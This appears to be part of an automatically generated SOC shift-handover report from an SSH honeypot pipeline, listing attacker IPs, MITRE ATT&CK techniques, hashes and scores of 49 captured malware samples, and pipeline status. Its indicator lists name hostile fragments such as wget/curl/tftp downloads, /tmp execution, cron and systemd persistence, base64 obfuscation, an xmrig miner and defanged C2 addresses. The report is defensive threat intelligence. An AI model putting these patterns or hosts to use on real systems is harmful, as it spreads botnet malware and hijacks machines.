| `18.218.118[.]203` | 1 | 2026-11-28 04:45 | 2026-11-28 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.46.52[.]60` | 1 | 2026-11-28 02:53 | 2026-11-28 02:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-11-28 00:14 | 2026-11-28 00:14 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-11-28 01:50 | 2026-11-28 01:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.44.138[.]187` | 1 | 2026-11-28 02:29 | 2026-11-28 02:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.99.71[.]201` | 1 | 2026-11-28 03:20 | 2026-11-28 03:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-28 01:29 | 2026-11-28 01:29 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.56.43[.]199` | 1 | 2026-11-28 02:56 | 2026-11-28 02:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.97.112[.]179` | 1 | 2026-11-28 01:41 | 2026-11-28 01:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `35.206.182[.]187` | 1 | 2026-11-28 03:24 | 2026-11-28 03:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.13[.]57` | 1 | 2026-11-28 04:15 | 2026-11-28 04:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.132[.]194` | 1 | 2026-11-28 04:00 | 2026-11-28 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.208[.]132` | 1 | 2026-11-28 03:44 | 2026-11-28 03:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.39[.]217` | 1 | 2026-11-28 03:13 | 2026-11-28 03:13 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.88[.]112` | 1 | 2026-11-28 04:07 | 2026-11-28 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `4.148.241[.]1` | 1 | 2026-11-28 04:53 | 2026-11-28 04:53 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.119.44[.]142` | 1 | 2026-11-28 02:43 | 2026-11-28 02:43 | 9s | 0 | `T1592` | 🟢 LOW |
| `43.103.49[.]116` | 1 | 2026-11-28 02:15 | 2026-11-28 02:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.162.134[.]161` | 1 | 2026-11-28 04:36 | 2026-11-28 04:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.44.169[.]230` | 1 | 2026-11-28 00:11 | 2026-11-28 00:11 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-28 01:45 | 2026-11-28 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-28 00:19 | 2026-11-28 00:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.167.72[.]12` | 1 | 2026-11-28 01:15 | 2026-11-28 01:15 | 2s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]148` | 1 | 2026-11-28 01:08 | 2026-11-28 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-11-28 00:58 | 2026-11-28 00:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]209` | 1 | 2026-11-28 01:48 | 2026-11-28 01:48 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-11-28 03:02 | 2026-11-28 03:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]66` | 1 | 2026-11-28 04:08 | 2026-11-28 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-28 00:19 | 2026-11-28 00:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-28 02:37 | 2026-11-28 02:37 | 6s | 0 | `T1592` | 🟢 LOW |
| `81.211.72[.]167` | 1 | 2026-11-28 01:30 | 2026-11-28 01:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `87.196.244[.]56` | 1 | 2026-11-28 02:29 | 2026-11-28 02:29 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0964db06ea15cd9f97028f20c8dc86c1f8a409c8e9d5101ef93f054f7e4cd5e9` | ELF Binary (Linux executable) (ARM 32-bit) | `0964db06ea15cd9f...` | 30/100 | 🟢 LOW | Not in VT |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.97.112[.]179` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `62.60.130[.]148` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |
| `103.145.63[.]218` | VN | IDC Online Technology and Solutions Corporation | **100** ⚠️ | 50 |
| `40.119.44[.]142` | US | Microsoft Corporation | **100** ⚠️ | 25 |
| `193.32.162[.]84` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `166.62.41[.]96` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `181.46.52[.]60` | AR | Telecentro S.A. - Clientes Residenciales | **100** ⚠️ | 1 |
| `167.250.28[.]185` | BR | BLUE3 TECNOLOGIA EIRELI | **100** ⚠️ | 10 |
| `185.242.226[.]18` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `121.150.234[.]205` | KR | Korea Telecom | **100** ⚠️ | 49 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 89 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 86 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 19 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 146 cases |
| Tool 34  | Credential Extractor        | ✅ 1663 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 33 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (11.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 42 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 44 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-28T05:25:43Z_
